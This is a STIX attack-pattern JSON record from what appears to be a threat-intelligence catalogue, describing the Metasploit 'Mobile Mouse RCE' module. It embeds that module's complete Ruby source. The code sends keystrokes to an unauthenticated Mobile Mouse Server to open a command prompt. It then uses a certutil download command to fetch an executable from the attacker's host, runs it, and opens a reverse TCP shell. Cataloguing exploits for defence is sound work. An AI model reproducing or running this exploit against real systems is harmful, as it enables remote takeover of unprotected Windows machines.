{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dfb9e5b0-82f2-4c4a-b71e-fa6fa7a97dfb",
    "created": "2024-08-14T16:47:26.634371Z",
    "modified": "2024-08-14T16:47:26.634375Z",
    "name": "Mobile Mouse RCE",
    "description": " This module utilizes the Mobile Mouse Server by RPA Technologies, Inc protocol to deploy a payload and run it from the server.  This module will only deploy a payload if the server is set without a password (default). Tested against 3.6.0.4, current at the time of module writing  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/mobile_mouse_rce.rb",
            "external_id": "mobile_mouse_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://mobilemouse.com/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Exploit::Remote::Tcp\n  include Exploit::EXE # generate_payload_exe\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Mobile Mouse RCE',\n        'Description' => %q{\n          This module utilizes the Mobile Mouse Server by RPA Technologies, Inc protocol\n          to deploy a payload and run it from the server.  This module will only deploy\n          a payload if the server is set without a password (default).\n          Tested against 3.6.0.4, current at the time of module writing\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'CHOKRI HAMMEDI' # edb\n        ],\n        'References' => [\n          [ 'EDB', '51010' ],\n          [ 'URL', 'https://mobilemouse.com/' ],\n        ],\n        'Arch' => [ ARCH_X64, ARCH_X86 ],\n        'Platform' => 'win',\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Targets' => [\n          ['default', {}],\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x04\\x1E\"\n        },\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/shell/reverse_tcp'\n        },\n        'DisclosureDate' => '2022-09-20',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK] # typing on screen\n        }\n      )\n    )\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'Port Mobile Mouse runs on', 9099]),\n        OptInt.new('SLEEP', [true, 'How long to sleep between commands', 3]),\n        OptString.new('PATH', [true, 'Where to stage payload for pull method', 'c:\\\\Windows\\\\Temp\\\\']),\n        OptString.new('CLIENTNAME', [false, 'Name of client, this shows up in the logs', '']),\n      ]\n    )\n  end\n\n  def path\n    return datastore['PATH'] if datastore['PATH'].end_with? '\\\\'\n\n    \"#{datastore['PATH']}\\\\\"\n  end\n\n  def connect_command\n    connect_command = 'CONNECT' # 434F4E4E454354\n    connect_command << \"\\x1E\\x1E\"\n    connect_command << @client_name\n    connect_command << \"\\x1E\"\n    connect_command << 'iPhone' # 6950686F6E65\n    connect_command << \"\\x1E\"\n    # the next 2,2 may be a version number of some sort\n    connect_command << '2' # 32\n    connect_command << \"\\x1E\"\n    connect_command << '2' # 32\n    connect_command << \"\\x1E\\x04\"\n    sock.put(connect_command)\n    sleep(datastore['SLEEP'])\n  end\n\n  def open_command_prompt\n    open_command_prompt = 'KEY' # 4b4559\n    open_command_prompt << \"\\x1E\"\n    open_command_prompt << '114' # 313134 windows key?\n    open_command_prompt << \"\\x1E\"\n    open_command_prompt << 'r' # 72\n    open_command_prompt << \"\\x1E\"\n    open_command_prompt << 'OPT' # 4f5054\n    open_command_prompt << \"\\x04\"\n    sock.put(open_command_prompt)\n    sleep(datastore['SLEEP'])\n  end\n\n  def script_content(payload)\n    script_content = 'KEY' # 4B4559\n    script_content << \"\\x1E\"\n    script_content << '100' # 313030\n    script_content << \"\\x1E\"\n    script_content << payload\n    script_content << \"\\x1E\\x04\"\n    script_content << 'KEY' # 4B4559\n    script_content << \"\\x1E\"\n    script_content << '-1' # 2d31\n    script_content << \"\\x1E\"\n    script_content << 'ENTER' # 454e544552\n    script_content << \"\\x1E\\x04\"\n    sock.put(script_content)\n    sleep(datastore['SLEEP'])\n  end\n\n  def on_request_uri(cli, _req)\n    p = generate_payload_exe\n    send_response(cli, p)\n    print_good(\"Payload request received, sending #{p.length} bytes of payload for staging\")\n  end\n\n  def check\n    if datastore['CLIENTNAME'].blank?\n      @client_name = Rex::Text.rand_text_alphanumeric(5..10).to_s\n      print_status(\"Client name set to: #{@client_name}\")\n    else\n      @client_name = datastore['CLIENTNAME']\n    end\n\n    connect\n\n    print_status('Connecting')\n    connect_command\n    res = sock.get_once\n    if res.nil?\n      return CheckCode::Unknown('No response received from target')\n    end\n\n    disconnect\n\n    res = res.split(\"\\x1E\")\n    if res[1] == 'NO'\n      return CheckCode::Safe(\"Unable to connect, server response: #{res[4]}\")\n    end\n\n    CheckCode::Appears(\"Connected to hostname #{res[3]} with MAC address #{res[5]}\")\n  end\n\n  def exploit\n    if datastore['CLIENTNAME'].blank?\n      @client_name = Rex::Text.rand_text_alphanumeric(5..10).to_s\n      print_status(\"Client name set to: #{@client_name}\")\n    else\n      @client_name = datastore['CLIENTNAME']\n    end\n\n    connect\n\n    print_status('Connecting')\n    connect_command\n    res = sock.get_once\n    if res.nil?\n      fail_with(Failure::Disconnected, 'No response received from target')\n    end\n\n    res = res.split(\"\\x1E\")\n    if res[1] == 'NO'\n      fail_with(Failure::NoAccess, \"Unable to connect, server response: #{res[4]}\")\n    end\n    vprint_good(\"Connected to hostname #{res[3]} with MAC address #{res[5]}\")\n\n    print_status('Opening Command Prompt')\n    open_command_prompt\n    # for whatever reason, if we don't read here the server doesn't want to keep playing with us, so read but throw away\n    sock.get_once\n\n    print_status('Sending stager')\n    filename = Rex::Text.rand_text_alphanumeric(rand(8..17)) + '.exe'\n    register_file_for_cleanup(\"#{path}#{filename}\")\n    # I attempted to put this all in one, stage, run, exit, but it was never successful, so we'll keep it in 2\n    stager = \"certutil.exe -urlcache -f http://#{datastore['lhost']}:#{datastore['SRVPORT']}/ #{path}#{filename}\"\n    start_service('Path' => '/') # start webserver\n    script_content(stager)\n\n    print_status('Opening Command Prompt again')\n    open_command_prompt\n    print_status('Executing payload')\n    script_content(\"#{path}#{filename} && exit\")\n\n    handler\n    disconnect\n    sleep(datastore['SLEEP'] * 2) # give time for it to do its thing before we revert\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-09-20",
    "x_mitre_platforms": [
        "win'"
    ]
}